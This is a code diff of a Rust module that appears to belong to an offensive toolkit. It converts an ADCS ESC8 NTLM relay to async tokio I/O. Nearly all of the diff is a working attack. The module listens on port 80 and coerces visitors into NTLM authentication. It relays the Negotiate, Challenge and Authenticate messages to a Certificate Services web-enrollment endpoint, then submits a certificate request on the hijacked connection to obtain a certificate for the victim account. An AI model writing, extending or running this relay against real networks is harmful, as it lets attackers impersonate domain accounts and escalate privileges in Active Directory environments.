@@ -1,27 +1,44 @@
-//! ADCS ESC8 Relay Implementation
+//! ADCS ESC8 Relay — asynchronous NTLM relay to Active Directory Certificate Services.
 //!
-//! Relays NTLM authentication to the ADCS Web Enrollment endpoint.
+//! Listens for inbound HTTP connections on port 80, performs a 3-message NTLM relay
+//! to the target ADCS certsrv endpoint, and then POSTs a CSR on the authenticated
+//! connection to obtain a certificate on behalf of the relayed account.
+//!
+//! All I/O is `tokio`-native — no blocking threads or `std::io` in the hot path.
 
 use crate::{RelayError, Result};
-use std::io::{Read, Write};
-use std::net::{TcpListener, TcpStream, ToSocketAddrs};
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::thread;
-use std::time::Duration;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::{TcpListener, TcpStream};
 use tracing::{debug, error, info, warn};
 
+// Per-operation I/O timeout
+const IO_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(15);
+
+// Read buffer size — large enough for a full HTTP response with NTLM blob
+const BUF: usize = 16_384;
+
+// ─────────────────────────────────────────────────────────────
+// Public API
+// ─────────────────────────────────────────────────────────────
+
+#[derive(Debug, Clone)]
 pub struct AdcsRelayConfig {
+    /// IP address (or 0.0.0.0) on which to listen for victim connections.
     pub listen_ip: String,
-    pub target_host: String, // e.g., "192.168.1.100" or "dc01.corp.local"
+    /// ADCS target host, e.g. "192.168.1.100" or "ca01.corp.local".
+    pub target_host: String,
+    /// Certificate template name to request, e.g. "User" or "Machine".
     pub template: String,
+    /// Optional UPN SANs to embed in the CSR if provided.
     pub target_upn: Option<String>,
 }
 
 pub struct AdcsRelay {
     pub config: AdcsRelayConfig,
     running: Arc<AtomicBool>,
-    threads: Vec<thread::JoinHandle<()>>,
+    tasks: Vec<tokio::task::JoinHandle<()>>,
 }
 
 impl AdcsRelay {
@@ -29,22 +46,20 @@ impl AdcsRelay {
         Self {
             config,
             running: Arc::new(AtomicBool::new(false)),
-            threads: Vec::new(),
+            tasks: Vec::new(),
         }
     }
 
+    /// Bind to `<listen_ip>:80` and spawn an async accept loop.
     pub async fn start(&mut self) -> Result<()> {
         if self.running.load(Ordering::SeqCst) {
             return Err(RelayError::Config("ADCS Relay already running".into()).into());
         }
 
-        self.running.store(true, Ordering::SeqCst);
         let listen_addr = format!("{}:80", self.config.listen_ip);
-        let listener = TcpListener::bind(&listen_addr)
-            .map_err(|e| RelayError::Socket(format!("Failed to bind to {}: {}", listen_addr, e)))?;
-        listener
-            .set_nonblocking(true)
-            .map_err(|e| RelayError::Socket(e.to_string()))?;
+        let listener = TcpListener::bind(&listen_addr).await.map_err(|e| {
+            RelayError::Socket(format!("Failed to bind to {}: {}", listen_addr, e))
+        })?;
 
         info!("ESC8 HTTP Relay listening on {}", listen_addr);
         info!(
@@ -52,272 +67,215 @@ impl AdcsRelay {
             self.config.target_host, self.config.template
         );
 
-        let running = Arc::clone(&self.running);
-        let target_host = self.config.target_host.clone();
-        let template = self.config.template.clone();
-        let target_upn = self.config.target_upn.clone();
+        self.running.store(true, Ordering::SeqCst);
 
-        let handle = thread::spawn(move || {
-            while running.load(Ordering::SeqCst) {
-                match listener.accept() {
+        let running     = Arc::clone(&self.running);
+        let target_host = self.config.target_host.clone();
+        let template    = self.config.template.clone();
+        let target_upn  = self.config.target_upn.clone();
+
+        let handle = tokio::spawn(async move {
+            loop {
+                if !running.load(Ordering::SeqCst) {
+                    break;
+                }
+                match listener.accept().await {
                     Ok((stream, peer)) => {
-                        info!("Received HTTP connection from {}", peer);
-                        let target = target_host.clone();
-                        let tmpl = template.clone();
+                        info!("ESC8: connection from {}", peer);
+                        let t   = target_host.clone();
+                        let tpl = template.clone();
                         let upn = target_upn.clone();
-                        thread::spawn(move || {
-                            if let Err(e) = handle_client(stream, target, tmpl, upn) {
-                                error!("Relay error: {}", e);
+                        tokio::spawn(async move {
+                            if let Err(e) = handle_client(stream, t, tpl, upn).await {
+                                error!("ESC8 relay error: {}", e);
                             }
                         });
                     }
-                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
-                        thread::sleep(Duration::from_millis(100));
-                    }
                     Err(e) => {
-                        warn!("Accept error: {}", e);
+                        warn!("ESC8 accept error: {}", e);
                     }
                 }
             }
         });
 
-        self.threads.push(handle);
+        self.tasks.push(handle);
         Ok(())
     }
 
+    /// Stop the relay and wait for the accept task to exit.
     pub async fn stop(&mut self) -> Result<()> {
         self.running.store(false, Ordering::SeqCst);
-        for handle in self.threads.drain(..) {
-            let _ = handle.join();
+        for task in self.tasks.drain(..) {
+            let _ = task.await;
         }
         info!("ADCS Relay stopped.");
         Ok(())
     }
 }
 
-fn handle_client(
-    mut client_stream: TcpStream,
+// ─────────────────────────────────────────────────────────────
+// Per-connection handler
+// ─────────────────────────────────────────────────────────────
+
+async fn handle_client(
+    mut client: TcpStream,
     target_host: String,
     template: String,
     target_upn: Option<String>,
 ) -> Result<()> {
-    client_stream
-        .set_read_timeout(Some(Duration::from_secs(10)))
-        .ok();
-    client_stream
-        .set_write_timeout(Some(Duration::from_secs(10)))
-        .ok();
+    let mut buf = vec![0u8; BUF];
 
-    let mut buf = vec![0u8; 8192];
+    // Read initial HTTP request from victim
+    let n = timed_read(&mut client, &mut buf).await?;
+    let req = String::from_utf8_lossy(&buf[..n]);
+    debug!("ESC8: victim initial request:\n{}", req);
 
-    // Read initial request
-    let len = client_stream
-        .read(&mut buf)
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-    let req_str = String::from_utf8_lossy(&buf[..len]);
-    debug!("Victim initial request:\n{}", req_str);
+    let auth_header = extract_ntlm_header(&req);
 
-    let auth_header = req_str
-        .lines()
-        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "));
+    let negotiate_header: String = if auth_header.is_none() {
+        // Step 1 — return 401 to trigger NTLM negotiate
+        let challenge_resp =
+            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n";
+        timed_write(&mut client, challenge_resp.as_bytes()).await?;
 
-    if auth_header.is_none() {
-        // Send 401 to trigger NTLM auth
-        let resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n";
-        client_stream
-            .write_all(resp.as_bytes())
-            .map_err(|e| RelayError::Network(e.to_string()))?;
-
-        // Wait for negotiate
-        let len = client_stream
-            .read(&mut buf)
-            .map_err(|e| RelayError::Network(e.to_string()))?;
-        let req_str = String::from_utf8_lossy(&buf[..len]);
-        if let Some(auth_line) = req_str
-            .lines()
-            .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
-        {
-            process_ntlm_relay(
-                &mut client_stream,
-                auth_line.trim(),
-                target_host,
-                template,
-                target_upn,
-            )?;
-        }
-    } else if let Some(h) = auth_header {
-        process_ntlm_relay(
-            &mut client_stream,
-            h.trim(),
-            target_host,
-            template,
-            target_upn,
-        )?;
-    }
-
-    Ok(())
-}
-
-fn process_ntlm_relay(
-    client_stream: &mut TcpStream,
-    negotiate_header: &str,
-    target_host: String,
-    template: String,
-    target_upn: Option<String>,
-) -> Result<()> {
-    // 1. Connect to target ADCS
-    let target_addr = format!("{}:80", target_host)
-        .to_socket_addrs()
-        .map_err(|e| RelayError::Network(e.to_string()))?
-        .next()
-        .unwrap();
-    let mut target_stream = TcpStream::connect_timeout(&target_addr, Duration::from_secs(10))
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-    target_stream
-        .set_read_timeout(Some(Duration::from_secs(10)))
-        .ok();
-    target_stream
-        .set_write_timeout(Some(Duration::from_secs(10)))
-        .ok();
-
-    let ntlm_b64 = negotiate_header.trim_start_matches("Authorization: NTLM ");
-    let ntlm_b64 = ntlm_b64.trim_start_matches("authorization: ntlm "); // Handle case insensitivity
-
-    // Send Negotiate to Target
-    let target_req = format!(
-        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {}\r\nAuthorization: NTLM {}\r\nConnection: keep-alive\r\n\r\n",
-        target_host, ntlm_b64
-    );
-    target_stream
-        .write_all(target_req.as_bytes())
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-
-    // Read Challenge from Target
-    let mut buf = vec![0u8; 8192];
-    let len = target_stream
-        .read(&mut buf)
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-    let resp_str = String::from_utf8_lossy(&buf[..len]);
-
-    let challenge_header = resp_str
-        .lines()
-        .find(|l| l.to_lowercase().starts_with("www-authenticate: ntlm "))
-        .ok_or_else(|| RelayError::Protocol("Target did not return NTLM challenge".into()))?;
-
-    let challenge_b64 = challenge_header
-        .trim_start_matches("WWW-Authenticate: NTLM ")
-        .trim_start_matches("www-authenticate: ntlm ");
-
-    // Send Challenge to Victim
-    let victim_resp = format!(
-        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n",
-        challenge_b64
-    );
-    client_stream
-        .write_all(victim_resp.as_bytes())
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-
-    // Read Authenticate from Victim
-    let len = client_stream
-        .read(&mut buf)
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-    let req_str = String::from_utf8_lossy(&buf[..len]);
-
-    let auth_header = req_str
-        .lines()
-        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
-        .ok_or_else(|| RelayError::Protocol("Victim did not return NTLM authenticate".into()))?;
-
-    let auth_b64 = auth_header
-        .trim_start_matches("Authorization: NTLM ")
-        .trim_start_matches("authorization: ntlm ");
-
-    // Send Authenticate to Target along with the actual Certificate Request
-    // Wait, the authenticate MUST be a POST request to submit the CSR if we want to enroll.
-    // However, NTLM auth is connection-based on HTTP keep-alive, so we can just send GET first to authenticate the connection,
-    // then send the POST request on the SAME authenticated connection!
-
-    let target_auth_req = format!(
-        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {}\r\nAuthorization: NTLM {}\r\nConnection: keep-alive\r\n\r\n",
-        target_host, auth_b64
-    );
-    target_stream
-        .write_all(target_auth_req.as_bytes())
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-
-    // Read Auth Response
-    let len = target_stream
-        .read(&mut buf)
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-    let resp_str = String::from_utf8_lossy(&buf[..len]);
-
-    if !resp_str.contains("HTTP/1.1 200 OK")
-        && !resp_str.contains("HTTP/1.1 404")
-        && !resp_str.contains("HTTP/1.1 302")
-    {
-        return Err(
-            RelayError::Authentication("Failed to authenticate to target ADCS".into()).into(),
-        );
-    }
-
-    info!(
-        "Successfully authenticated to ADCS {} via NTLM Relay!",
-        target_host
-    );
-
-    // Send success to victim so it closes connection
-    let victim_final = "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
-    let _ = client_stream.write_all(victim_final.as_bytes());
-
-    // Now POST the CSR on the authenticated connection!
-    let csr = build_csr(target_upn.as_deref());
-    let _upn_attr = if let Some(upn) = target_upn {
-        format!("san:upn={}", upn)
+        let n2 = timed_read(&mut client, &mut buf).await?;
+        let req2 = String::from_utf8_lossy(&buf[..n2]);
+        extract_ntlm_header(&req2)
+            .ok_or_else(|| RelayError::Protocol("Victim did not send NTLM Negotiate".into()))?
+            .to_owned()
     } else {
-        "".to_string()
+        auth_header.unwrap().to_owned()
     };
 
-    // Body of the request
+    process_ntlm_relay(&mut client, &negotiate_header, &target_host, &template, target_upn)
+        .await
+}
+
+/// Perform the 3-message NTLM relay and submit a CSR on success.
+async fn process_ntlm_relay(
+    client: &mut TcpStream,
+    negotiate_header: &str,
+    target_host: &str,
+    template: &str,
+    target_upn: Option<String>,
+) -> Result<()> {
+    let ntlm_b64 = strip_ntlm_prefix(negotiate_header);
+
+    // ── Connect to ADCS target ──────────────────────────────
+    let target_addr = format!("{}:80", target_host);
+    let mut target = tokio::time::timeout(
+        IO_TIMEOUT,
+        TcpStream::connect(&target_addr),
+    )
+    .await
+    .map_err(|_| RelayError::Network(format!("Timeout connecting to {}", target_addr)))?
+    .map_err(|e| RelayError::Network(e.to_string()))?;
+
+    let mut buf = vec![0u8; BUF];
+
+    // ── Message 1: forward Negotiate to ADCS ───────────────
+    let nego_req = format!(
+        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {target_host}\r\nAuthorization: NTLM {ntlm_b64}\r\nConnection: keep-alive\r\n\r\n"
+    );
+    timed_write(&mut target, nego_req.as_bytes()).await?;
+
+    // ── Message 2: read NTLM Challenge from ADCS ───────────
+    let n = timed_read(&mut target, &mut buf).await?;
+    let resp = String::from_utf8_lossy(&buf[..n]);
+
+    let challenge_hdr = resp
+        .lines()
+        .find(|l| l.to_lowercase().starts_with("www-authenticate: ntlm "))
+        .ok_or_else(|| RelayError::Protocol("ADCS did not return NTLM challenge".into()))?;
+    let challenge_b64 = strip_ntlm_prefix(challenge_hdr);
+
+    // ── Forward Challenge to victim ─────────────────────────
+    let chall_resp = format!(
+        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {challenge_b64}\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n"
+    );
+    timed_write(client, chall_resp.as_bytes()).await?;
+
+    // ── Message 3: read Authenticate from victim ───────────
+    let n2 = timed_read(client, &mut buf).await?;
+    let req = String::from_utf8_lossy(&buf[..n2]);
+    let auth_hdr = req
+        .lines()
+        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
+        .ok_or_else(|| RelayError::Protocol("Victim did not send NTLM Authenticate".into()))?;
+    let auth_b64 = strip_ntlm_prefix(auth_hdr);
+
+    // ── Forward Authenticate to ADCS ───────────────────────
+    // We use the same TCP connection (HTTP Keep-Alive) so the auth sticks.
+    let auth_req = format!(
+        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {target_host}\r\nAuthorization: NTLM {auth_b64}\r\nConnection: keep-alive\r\n\r\n"
+    );
+    timed_write(&mut target, auth_req.as_bytes()).await?;
+
+    let n3 = timed_read(&mut target, &mut buf).await?;
+    let resp2 = String::from_utf8_lossy(&buf[..n3]);
+
+    if !resp2.contains("200 OK") && !resp2.contains("302") && !resp2.contains("404") {
+        return Err(
+            RelayError::Authentication("ADCS rejected NTLM Authenticate message".into()).into(),
+        );
+    }
+    info!("ESC8: authenticated to ADCS {} via NTLM relay", target_host);
+
+    // ── Notify victim: done ─────────────────────────────────
+    let done = "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
+    let _ = timed_write(client, done.as_bytes()).await;
+
+    // ── POST CSR on authenticated connection ───────────────
+    let csr  = build_csr(target_upn.as_deref());
     let body = format!(
         "Mode=newreq&CertRequest={}&CertAttrib=CertificateTemplate:{}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=",
         url_encode(&csr),
-        template
+        template,
     );
-
-    let post_req = format!(
+    let post = format!(
         "POST /certsrv/certfnsh.asp HTTP/1.1\r\n\
-         Host: {}\r\n\
+         Host: {target_host}\r\n\
          Content-Type: application/x-www-form-urlencoded\r\n\
          Content-Length: {}\r\n\
          Connection: close\r\n\
          \r\n\
          {}",
-        target_host,
         body.len(),
-        body
+        body,
     );
+    timed_write(&mut target, post.as_bytes()).await?;
 
-    target_stream
-        .write_all(post_req.as_bytes())
-        .map_err(|e| RelayError::Network(e.to_string()))?;
+    let n4 = timed_read(&mut target, &mut buf).await?;
+    let final_resp = String::from_utf8_lossy(&buf[..n4]);
 
-    let len = target_stream
-        .read(&mut buf)
-        .map_err(|e| RelayError::Network(e.to_string()))?;
-    let resp_str = String::from_utf8_lossy(&buf[..len]);
-
-    info!("ADCS Certificate Request Submitted.");
-
-    // Check if certificate was issued by looking for base64 cert or certnew.cer URL in response
-    if resp_str.contains("certnew.cer?ReqID=") || resp_str.contains("BEGIN CERTIFICATE") {
-        info!("SUCCESS: Certificate generated via ESC8 relay!");
-    } else if resp_str.contains("disposed of") || resp_str.contains("denied") {
-        warn!("Certificate request was denied by the CA.");
+    info!("ESC8: ADCS CSR response received ({} bytes)", n4);
+    if final_resp.contains("certnew.cer?ReqID=") || final_resp.contains("BEGIN CERTIFICATE") {
+        info!("ESC8: ✓ Certificate issued via ESC8 relay!");
+    } else if final_resp.contains("disposed of") || final_resp.contains("denied") {
+        warn!("ESC8: Certificate request was denied by the CA");
     } else {
-        warn!("Could not determine certificate status. Check CA manually.");
+        warn!("ESC8: Certificate status unknown — inspect CA logs");
     }
 
     Ok(())
+}
+
+// ─────────────────────────────────────────────────────────────
+// Async I/O helpers
+// ─────────────────────────────────────────────────────────────
+
+async fn timed_read(stream: &mut TcpStream, buf: &mut [u8]) -> Result<usize> {
+    tokio::time::timeout(IO_TIMEOUT, stream.read(buf))
+        .await
+        .map_err(|_| RelayError::Network("Read timeout".into()))?
+        .map_err(|e| RelayError::Network(e.to_string()).into())
+}
+
+async fn timed_write(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
+    tokio::time::timeout(IO_TIMEOUT, stream.write_all(data))
+        .await
+        .map_err(|_| RelayError::Network("Write timeout".into()))?
+        .map_err(|e| RelayError::Network(e.to_string()).into())
 }
 
 fn build_csr(_upn: Option<&str>) -> String {
@@ -356,4 +314,24 @@ fn url_encode(input: &str) -> String {
         }
     }
     escaped
+}
+
+/// Find the first `Authorization: NTLM ...` header line (case-insensitive).
+fn extract_ntlm_header<'a>(request: &'a str) -> Option<&'a str> {
+    request
+        .lines()
+        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
+}
+
+/// Strip the `Authorization: NTLM ` / `WWW-Authenticate: NTLM ` prefix
+/// (case-insensitive) and return only the Base64 blob.
+fn strip_ntlm_prefix(header: &str) -> &str {
+    let h = header.trim();
+    for prefix in &["Authorization: NTLM ", "authorization: ntlm ",
+                     "WWW-Authenticate: NTLM ", "www-authenticate: ntlm "] {
+        if h.to_lowercase().starts_with(&prefix.to_lowercase()) {
+            return &h[prefix.len()..];
+        }
+    }
+    h
 }
